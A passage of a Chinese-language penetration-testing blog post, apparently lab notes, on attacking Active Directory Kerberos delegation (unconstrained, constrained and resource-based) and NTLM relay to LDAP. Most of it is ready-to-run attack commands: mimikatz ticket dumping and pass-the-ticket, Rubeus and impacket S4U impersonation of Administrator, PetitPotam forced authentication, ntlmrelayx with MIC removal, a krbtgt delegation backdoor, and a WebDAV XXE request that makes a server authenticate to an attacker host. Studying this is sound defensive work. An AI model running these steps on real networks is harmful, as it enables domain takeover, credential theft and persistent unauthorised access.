+<h3 id="利用现成票据"><a href="#利用现成票据" class="headerlink" title="利用现成票据"></a>利用现成票据</h3><p>如果以前有机器访问过非约束委派机器那么内存中肯定有现成的TGT，直接导出当前票据看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">klist</span><br><span class="line"># 查看票据</span><br><span class="line">mimikatz.exe &quot;kerberos::list&quot;</span><br><span class="line"></span><br><span class="line"># 域内主机导出票据</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br><span class="line"></span><br><span class="line"># 导入内存</span><br><span class="line">mimikatz.exe &quot;kerberos::ptt [0;cfd6c]-2-0-60a10000-Administrator@krbtgt-REDTEAM.LAB.kirbi&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line"># 访问目标盘</span><br><span class="line">dir \\DC2016.redteam.lab\c$</span><br></pre></td></tr></table></figure>
+
+<h3 id="强制身份认证"><a href="#强制身份认证" class="headerlink" title="强制身份认证"></a>强制身份认证</h3><p>可见《NTLM Relay-获取NTLM方式》通过以下几种 漏洞/特性/bug 强制目标主机对非约束委派账号进行身份认证，此时非约束委派机器内存中就有目标TGT</p>
+<ul>
+<li>PrinterBug</li>
+<li>PeitiPotam</li>
+<li>DFSCoerce</li>
+<li>ShadowCoerce</li>
+<li>PrivExchange</li>
+</ul>
+<p>委派机器监听TGT</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:3 &#x2F;targetuser:DC01$ &#x2F;nowrap</span><br></pre></td></tr></table></figure>
+
+<p>PetitPotam进行强制认证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-PetitPotam -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<p>将Rubeus接收内容保存为票据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;doIFlDCCBZCg..&#39; | base64 -d &gt; DC.kirbi</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="攻击-约束委派"><a href="#攻击-约束委派" class="headerlink" title="攻击-约束委派"></a>攻击-约束委派</h1><p>根据约束委派流程，配置了约束委派的账号无法缓存目标的TGT，<strong>只能通过S4U协议获取某些特定的服务的ST</strong>，针对约束委派的攻击有以下思路：如果能拿到约束委派用户（或主机）的密码或者Hash，就可以伪造S4U请求：伪装成服务用户以 <strong>任意用户的权限</strong> 申请 <strong>指定服务的ST</strong></p>
+<p><strong>利用前提：</strong>设置了 <strong>仅信任此用户作为指定服务的委派 - 使用任何身份验证协议</strong> 这是因为委派攻击核心是要通过S4U2Self协议去伪造任意用户，如果设置了仅使用 Kerberos，则强制仅使用S4U2Proxy。</p>
+<blockquote>
+<p>比如查出来WIN7$有约束委派，委派的服务为域控的CIFS（Windows文件共享），当拿到WIN7的凭证后就可以伪造域管administrator去访问域控的文件系统</p>
+</blockquote>
+<p>deepseek总结的</p>
+<table>
+<thead>
+<tr>
+<th>攻击场景</th>
+<th>目标 SPN</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI 远程执行</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>PowerShell/WinRM 远程</td>
+<td>HTTP</td>
+</tr>
+<tr>
+<td>DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>文件共享访问</td>
+<td>CIFS</td>
+</tr>
+</tbody></table>
+<h2 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h2><p>为域内用户tom注册SPN使其成为服务账户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -Q test&#x2F;win7.test.com</span><br><span class="line">setspn -S test&#x2F;win7.test.com test\tom</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517122014241.png" alt="image-20250517122014241"></p>
+<p>随后配置约束委派，将其委派到域控的CIFS服务</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517164652612.png" alt="image-20250517164652612"></p>
+<p>通过impacket查询域内委派关系，不同的设置回显也不同，此时代表环境模拟成功</p>
+<p>仅使用Kerberos：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517122710952.png" alt="image-20250517122710952"></p>
+<p>使用任何身份验证协议：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517162011925.png" alt="image-20250517162011925"></p>
+<h2 id="约束委派查询"><a href="#约束委派查询" class="headerlink" title="约束委派查询"></a>约束委派查询</h2><p>powerview：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导入 PowerView 脚本</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"># 查询域内约束性委派的计算机</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain zjun.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto |fl</span><br><span class="line"></span><br><span class="line"># 查询域内非约束性委派的服务账号</span><br><span class="line">Get-DomainUser -TrustedToAuth -Domain zjun.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto |fl</span><br></pre></td></tr></table></figure>
+
+<p>ADFind：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询域内约束性委派的计算机</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># 查询约束性委派的服务账号</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p>ldapsearch：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询域内约束性委派的计算机</span><br><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br><span class="line"></span><br><span class="line"># 查询非束性委派的服务账号</span><br><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h2><h3 id="有委派账号凭证"><a href="#有委派账号凭证" class="headerlink" title="有委派账号凭证"></a>有委派账号凭证</h3><p>如果直接有委派账号的凭证（明文密码、hash）可直接获取特定服务的ST。</p>
+<ul>
+<li>Rubeus：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 利用票据</span><br><span class="line">Rubeus.exe asktgt &#x2F;user:WIN10-1$ &#x2F;rc4:8f91f8786d308e62c609688886dc7c4c &#x2F;domain:redteam.lab &#x2F;dc:DC2016.redteam.lab &#x2F;nowrap</span><br><span class="line">Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;msdsspn:CIFS&#x2F;DC2016.redteam.lab &#x2F;dc:DC2016.redteam.lab &#x2F;ptt &#x2F;ticket:doIE7DCCB</span><br><span class="line"></span><br><span class="line"># 直接申请ST</span><br><span class="line">Rubeus.exe s4u &#x2F;user:tom &#x2F;rc4:40863c69c2e2ef8ed9c233d9c7b95140 &#x2F;impersonateuser:Administrator &#x2F;msdsspn:CIFS&#x2F;DC-1.test.com &#x2F;domain:test.com &#x2F;dc:DC-1.test.com &#x2F;ptt &#x2F;nowrap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517171902589.png" alt="image-20250517171902589"></p>
+<ul>
+<li>impacket：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 利用票据</span><br><span class="line">impacket-getTGT -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br><span class="line">impacket-getST -dc-ip 192.168.100.128 -spn CIFS&#x2F;DC-1.test.com -impersonate Administrator -k -no-pass test.com&#x2F;tom</span><br><span class="line"></span><br><span class="line"># 直接申请ST</span><br><span class="line">impacket-getST -dc-ip 192.168.100.128 -spn CIFS&#x2F;DC-1.test.com -impersonate Administrator test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用任何身份验证协议</strong>，直接申请特定服务ST</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-getST -dc-ip 192.168.100.128 -spn CIFS&#x2F;DC-1.test.com -impersonate Administrator test.com&#x2F;tom:Ab123456</span><br><span class="line">export KRB5CCNAME&#x3D;Administrator@CIFS_DC-1.test.com@TEST.COM.ccache</span><br><span class="line">impacket-smbclient -k -no-pass Administrator@DC-1.test.com -dc-ip 192.168.100.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517124114941.png" alt="image-20250517124114941"></p>
+<p><strong>仅使用 Kerberos</strong>，就会报错 <code>KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517125252309.png" alt="image-20250517125252309"></p>
+<ul>
+<li>kekeo：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 本地申请服务账号TGT</span><br><span class="line">kekeo.exe &quot;tgt::ask &#x2F;user:many &#x2F;domain:xiaorang.lab &#x2F;password:asd123! &#x2F;ticket:many.kirbi&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line"># 申请特定服务ST</span><br><span class="line">kekeo.exe &quot;tgs::s4u &#x2F;tgt:TGT_many@xiaorang.lab_krbtgt~haishi.com@xiaorang.lab.kirbi &#x2F;user:administrator@xiaorang.lab &#x2F;service:cifs&#x2F;DC.xiaorang.lab&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地导出委派账号票据"><a href="#本地导出委派账号票据" class="headerlink" title="本地导出委派账号票据"></a>本地导出委派账号票据</h3><p>如果没有委派账号的凭证，但是拿下了这台机器中有委派账号，直接提权抓凭证或者导出票据，剩下步骤同上</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导出票据</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="攻击-基于资源的约束性委派"><a href="#攻击-基于资源的约束性委派" class="headerlink" title="攻击-基于资源的约束性委派"></a>攻击-基于资源的约束性委派</h1><p>传统的约束委派是正向的, 需要以 SeEnableDelegation 权限将 Service A 的 <code>msDS-AllowedToDelegateTo</code> 属性指定为 Service B</p>
+<p>而基于资源的约束委派则是反向的，只需要在 Service B 上将 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指定为 Service A，从而指定只能ServiceA来访问自身服务</p>
+<p>配置 RBCD 的关键在于 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 通常以下用户能够修改此属性</p>
+<ul>
+<li>将主机加入域的用户 (机器账户中会有一个 msDS-CreatorSID 属性, 使用非域管账户加入域时才会显示)</li>
+<li>Account Operators (能修改任意域内非域控机器的委派属性)</li>
+<li>NT AUTHORITY\SELF (该主机的机器账户)</li>
+</ul>
+<p>根据RBCD特性，能够模拟其他用户的权限访问自己，所以资源的约束委派只能对自己进行攻击，也就是说 <strong>提权操作</strong> 或 <strong>权限维持</strong></p>
+<blockquote>
+<p>RBCD的攻击都是围绕 msDS-AllowedToActOnBehalfOfOtherIdentity 来进行的，由于该属性只能有特定的用户/用户组修改，所以RBCD攻击核心问题是要控制这些用户，从而修改此属性指向一个具有SPN的账户（S4U2Self只适用于具有SPN的账户），常规利用是指向一个新创建的机器账号（机器账户默认注册RestrictedKrbHost/domain和HOST/domain这两个SPN），利用新机器账号伪造administrator身份访问目标服务达到本地提权目的</p>
+</blockquote>
+<h2 id="RBCD查询"><a href="#RBCD查询" class="headerlink" title="RBCD查询"></a>RBCD查询</h2><p>分两种情况：</p>
+<ul>
+<li>拿下了一个域账号，查询能修改哪些机器，实现横向/提权</li>
+<li>拿下了一台域内机器，反向查询哪些域账号有修改权限，拿下域账号后实现提权</li>
+</ul>
+<p>情况一</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查用户账户SID</span><br><span class="line">whoami &#x2F;all</span><br><span class="line"></span><br><span class="line"># 使用PowerView查经由该用户加入域内的机器账户(主机)</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">Import-Module .\PowerView.ps1;</span><br><span class="line">Get-DomainObjectAcl | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-3222783777-1006235836-3661351843-1108&quot;&#125; | select objectdn,activedirectoryrights</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518004213338.png" alt="image-20250518004213338"></p>
+<p>情况二</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查SID</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;(&amp;(objectClass&#x3D;computer)(cn&#x3D;%COMPUTERNAME%))&quot; cn ms-DS-CreatorSID</span><br><span class="line"></span><br><span class="line"># 根据SID查账号</span><br><span class="line">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;com&quot; -f &quot;objectSid:&#x3D;S-1-5-21-3222783777-1006235836-3661351843-1108&quot; samaccountname</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250517235353832.png" alt="image-20250517235353832"></p>
+<p>综上能看到域账号tom能修改WIN7</p>
+<hr>
+<p>一个能查询域内用户与机器对应关系的工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Security.Principal;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line"></span><br><span class="line">namespace findCreator</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            DirectoryEntry ldap_conn &#x3D; new DirectoryEntry(&quot;LDAP:&#x2F;&#x2F;dc&#x3D;test,dc&#x3D;com&quot;);</span><br><span class="line">            DirectorySearcher search &#x3D; new DirectorySearcher(ldap_conn);</span><br><span class="line">            String query &#x3D; &quot;(&amp;(objectClass&#x3D;computer))&quot;; &#x2F;&#x2F; 查找计算机</span><br><span class="line">            search.Filter &#x3D; query;</span><br><span class="line"></span><br><span class="line">            foreach (SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                String mS_DS_CreatorSID &#x3D; &quot;&quot;;</span><br><span class="line">                String computername &#x3D; &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    computername &#x3D; r.Properties[&quot;dNSHostName&quot;][0].ToString();</span><br><span class="line">                    mS_DS_CreatorSID &#x3D; (new SecurityIdentifier((byte[])r.Properties[&quot;mS-DS-CreatorSID&quot;][0], 0)).ToString();</span><br><span class="line">                    &#x2F;&#x2F; Console.WriteLine(&quot;&#123;0&#125; &#123;1&#125;\n&quot;, computername, mS_DS_CreatorSID);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    ;</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; 再通过 SID 找用户名</span><br><span class="line">                String UserQuery &#x3D; &quot;(&amp;(objectClass&#x3D;user))&quot;;</span><br><span class="line">                DirectorySearcher search2 &#x3D; new DirectorySearcher(ldap_conn);</span><br><span class="line">                search2.Filter &#x3D; UserQuery;</span><br><span class="line"></span><br><span class="line">                foreach (SearchResult u in search2.FindAll())</span><br><span class="line">                &#123;</span><br><span class="line">                    String user_sid &#x3D; (new SecurityIdentifier((byte[])u.Properties[&quot;objectSid&quot;][0], 0)).ToString();</span><br><span class="line">                    if (user_sid &#x3D;&#x3D; mS_DS_CreatorSID)</span><br><span class="line">                    &#123;</span><br><span class="line">                        &#x2F;&#x2F; Console.WriteLine(&quot;debug&quot;);</span><br><span class="line">                        String username &#x3D; u.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                        Console.WriteLine(&quot;[*] [&#123;0&#125;] -&gt; creator [&#123;1&#125;]&quot;, computername, username);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520010138219.png" alt="image-20250520010138219"></p>
+<h2 id="攻击利用-2"><a href="#攻击利用-2" class="headerlink" title="攻击利用"></a>攻击利用</h2><h3 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h3><p>思路：</p>
+<ul>
+<li><p>利用可控域用户创建一个机器账户 (每个域用户默认可以创建 10 个机器账户, 即 <code>msDS-MachineAccountQuota (MAQ)</code> 属性)</p>
+</li>
+<li><p>修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性, 使其指向新创建机器账户的 SID</p>
+</li>
+<li><p>利用该机器账户的凭证通过 S4U 协议申请委派至目标主机的 ST 票据, 实现本地提权/横向移动</p>
+</li>
+</ul>
+<p>首先利用域账号创建机器账户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-addcomputer -computer-name TEST\$ -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>
+
+<p>配置  <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性指向新机器账户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-rbcd -dc-ip 192.168.100.128 -action write -delegate-to WIN7\$ -delegate-from TEST\$ test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518005445422.png" alt="image-20250518005445422"></p>
+<p>S4U 协议伪造 Administrator 用户申请 ST</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-getST -dc-ip 192.168.100.128 -spn cifs&#x2F;WIN7.test.com -impersonate Administrator test.com&#x2F;test\$:123456</span><br><span class="line">export KRB5CCNAME&#x3D;Administrator@cifs_WIN7.test.com@TEST.COM.ccache</span><br><span class="line">impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@WIN7.test.com</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里要把域控和目标添加到hosts中</p>
+<p>192.168.100.128 DC-1.test.com<br>192.168.100.130 WIN7.test.com</p>
+</blockquote>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518010827869.png" alt="image-20250518010827869"></p>
+<p><strong>RBCD属性清除</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 替换为目标计算机名称</span><br><span class="line">$ComputerName &#x3D; &quot;WIN7&quot;</span><br><span class="line"></span><br><span class="line"># 执行清除委派配置</span><br><span class="line">Set-ADComputer $ComputerName -Clear &quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250518020102797.png" alt="image-20250518020102797"></p>
+<h3 id="服务账户提权-Rotten-Tomato"><a href="#服务账户提权-Rotten-Tomato" class="headerlink" title="服务账户提权(Rotten Tomato)"></a>服务账户提权(Rotten Tomato)</h3><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw">https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw</a></p>
+<p>除了上述将主机加入域的用户账户能够修改属性，还有一个是 NT AUTHORITY\SELF（机器账户自身），<strong>在IIS、MSSQL、 Network Service 等服务账户出网时使用的是本机的机器账户，因此可以发起ldap请求以机器账户的身份修改自身的委派属性，从而提升至本地管理员权限</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/202308011607073.jpeg"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/1993669-20230110201520479-647285354.png"></p>
+<blockquote>
+<p>如果能控制虚拟账户下的某个服务发起ldap请求或者通过relay2ldap是不是一种新提权方式呢 🤔</p>
+</blockquote>
+<p>例如拿下MSSQL后，利用 <a target="_blank" rel="noopener" href="https://github.com/pkb1s/SharpAllowedToAct">SharpAllowedToAct</a> 添加机器账户并配置委派属性</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Public\SharpAllowedToAct.exe -m TEST -p 123456 -t MSSQL</span><br><span class="line"></span><br><span class="line">[+] Domain &#x3D; test.com</span><br><span class="line">[+] Domain Controller &#x3D; DC-1.test.com</span><br><span class="line">[+] New SAMAccountName &#x3D; TEST$</span><br><span class="line">[+] Distinguished Name &#x3D; CN&#x3D;TEST,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">[+] Machine account TEST added</span><br><span class="line">[+] SID of New Computer: S-1-5-21-3222783777-1006235836-3661351843-1113</span><br><span class="line">[+] Attribute changed successfully</span><br><span class="line">[+] Done!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520011417685.png" alt="image-20250520011417685"></p>
+<p>成功提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-getST -dc-ip 192.168.100.128 -spn cifs&#x2F;MSSQL.test.com -impersonate Administrator test.com&#x2F;test\$:123456</span><br><span class="line">export KRB5CCNAME&#x3D;Administrator@cifs_MSSQL.test.com@TEST.COM.ccache</span><br><span class="line">impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@MSSQL.test.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520011847537.png" alt="image-20250520011847537"></p>
+<h3 id="RBCD后门"><a href="#RBCD后门" class="headerlink" title="RBCD后门"></a>RBCD后门</h3><p>用作域控的权限维持，拿下域控后，设置 krbtgt 服务的委派属性为指定后门账户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 添加机器账户</span><br><span class="line">impacket-addcomputer -computer-name TEST\$ -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br><span class="line"></span><br><span class="line"># 设置RBCD</span><br><span class="line">powershell Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test$</span><br><span class="line"></span><br><span class="line"># PTT</span><br><span class="line">impacket-getST -dc-ip 192.168.100.128 -spn krbtgt -impersonate Administrator test.com&#x2F;test\$:123456</span><br><span class="line">export KRB5CCNAME&#x3D;Administrator.ccache</span><br><span class="line">impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@DC-1.test.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="NTLM-Relay-to-LDAP"><a href="#NTLM-Relay-to-LDAP" class="headerlink" title="NTLM Relay to LDAP"></a>NTLM Relay to LDAP</h3><p>通过不同协议relay2ldap完成RBCD的属性配置，实现RCE</p>
+<h4 id="SMB-CVE-2019-1040"><a href="#SMB-CVE-2019-1040" class="headerlink" title="SMB(CVE-2019-1040)"></a>SMB(CVE-2019-1040)</h4><p>默认情况下, LDAP 的签名策略为协商签名 (是否签名由客户端决定), 当使用 SMB 协议发起 LDAP 请求时, 就会要求 LDAP 服务器对 NTLM 认证请求强制签名, 所以一般来说无法通过 SMB 协议进行 NTLM Relay to LDAP，但是 2019 年爆出了 CVE-2019-1040 漏洞，它能够绕过 NTLM MIC 的防护机制，修改 NTLM 请求中的某些标志位，使得客户端对于 SMB 发起的 LDAP 请求不要求签名，从而实现 NTLM Relay</p>
+<p>通过 <strong>强制认证 + RBCD</strong> 可以实现普通域账号域内提权、横向移动</p>
+<blockquote>
+<p>如果是攻击域控的话需要有一个辅域环境，因为没法将主域控的ldap请求relay到自身，所以借助辅域控relay到主域控</p>
+</blockquote>
+<p>使用普通域账号添加机器账号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-addcomputer -computer-name TEST\$ -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br></pre></td></tr></table></figure>
+
+<p>开启relay，注意设置 <code>--remove-mic</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;DC-1.test.com -smb2support --remove-mic --delegate-access --escalate-user &#39;TEST$&#39;</span><br></pre></td></tr></table></figure>
+
+<p>强制域控进行认证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-PetitPotam -d test.com -dc-ip &lt;dc-ip&gt; -u tom -p Ab123456 &lt;kali&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这一块的协议细节和攻击利用场景还有很多需要学习：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/17606864.html">CVE-2019-1040配合打印机漏洞实现攻击Exchange进行资源委派攻击域控</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/15857942.html">CVE-2019-1040配合打印机漏洞实现攻击主域控进行资源委派攻击辅助域控</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/17904328.html">CVE-2019-1040 Drop The MIC漏洞</a></p>
+<h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>这里引入一个真实案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8OueE-bEIdkvwPWu3KqrcQ">这是一篇“不一样”的真实渗透测试案例分析文章</a>，介绍了利用WEBDAV XXE（JAVA）进行NTLM Relay从而搭配RBCD实现横向移动，其原理是：由于<code>sun.net.www.protocol.http.HttpURLConnection</code> 发送HTTP请求遇到状态码为401的HTTP返回头时，会判断该页面要求使用哪种认证方式，若攻击者回复要求采用NTLM认证则会自动使用当前用户凭据进行认证</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250520044458393.png" alt="image-20250520044458393"></p>
+<p>开启relay</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;dc-ip&gt; --delegate-access --escalate-user &#39;TEST$&#39;</span><br></pre></td></tr></table></figure>
+
+<p>发起XXE</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROPFIND &#x2F;webdav&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.30.20:8080</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 249</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE propertyupdate [</span><br><span class="line">&lt;!ENTITY loot SYSTEM &quot;http:&#x2F;&#x2F;192.168.30.40&#x2F;&quot;&gt; ]&gt;</span><br><span class="line">&lt;D:propertyupdate</span><br><span class="line">    xmlns:D&#x3D;&quot;DAV:&quot;&gt;</span><br><span class="line">    &lt;D:set&gt;</span><br><span class="line">        &lt;D:prop&gt;</span><br><span class="line">            &lt;a</span><br><span class="line">                xmlns&#x3D;&quot;http:&#x2F;&#x2F;192.168.30.40&#x2F;&quot;&gt;&amp;loot;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">        &lt;&#x2F;D:prop&gt;</span><br><span class="line">    &lt;&#x2F;D:set&gt;</span><br><span class="line">&lt;&#x2F;D:propertyupdate&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="WebDAV"><a href="#WebDAV" class="headerlink" title="WebDAV"></a>WebDAV</h4><p>原理文章：<a target="_blank" rel="noopener" href="https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/">Privilege Escalation - NTLM Relay over HTTP (Webdav)</a></p>
+<p>因为 SMB 协议导致协商签名的服务器对 NTLM 认证请求强制签名的原因，让攻击角度转向了那些不支持签名的客户端，例如 HTTP、WebDAV等</p>
